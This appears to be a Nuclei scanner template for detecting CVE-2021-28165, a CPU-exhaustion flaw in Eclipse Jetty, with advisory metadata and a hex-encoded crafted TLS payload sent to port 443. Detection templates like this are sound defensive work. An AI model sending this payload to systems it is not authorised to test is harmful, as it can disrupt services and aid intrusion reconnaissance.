id: CVE-2021-28165

info:
  name: Eclipse Jetty Invalid Large TLS Frame Handling
  author: ProjectDiscoveryAI
  severity: high
  description: |
    In Eclipse Jetty 7.2.2 to 9.4.38, 10.0.0.alpha0 to 10.0.1, and 11.0.0.alpha0 to 11.0.1, CPU usage can reach 100% upon receiving a large invalid TLS frame.
  reference:
    - https://github.com/eclipse/jetty.project/security/advisories/GHSA-26vr-8j45-3r4w
    - http://www.openwall.com/lists/oss-security/2021/04/20/3
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
    cvss-score: 7.5
    cve-id: CVE-2021-28165
    cwe-id: CWE-400,CWE-755
  remediation: |
    Upgrade to the latest version of Eclipse Jetty where the vulnerability is patched. Monitor CPU usage to detect any anomalies as a precautionary measure.

tcp:
  - inputs:
      - data: "{{hex_decode('16030140010100013c0303daba50ed99534d8758d5d25a6dece7000006c02b000005ff01000100')}}"
        type: hex
    host:
      - "{{Hostname}}"
    port: 443
    read-size: 2048
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "TLS"
        part: data
      - type: word
        words:
          - "alert"
        part: data